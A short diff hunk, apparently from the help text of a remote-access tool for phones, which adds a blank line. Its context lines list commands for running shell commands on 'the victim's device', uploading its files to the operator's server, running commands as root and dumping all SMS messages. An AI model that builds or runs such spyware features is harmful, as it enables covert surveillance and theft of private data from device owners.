@@ -34,6 +34,7 @@ Command :   - execute regular shell command on the victim's device
 Upload file :  - should be filled with full path to the file that will be uploaded to logs/ directory on your server
 
 Spec commands:
+
 root [command]    -  try to execute command as root (if device is rooted)
 
 sms  - get all sms dump from device
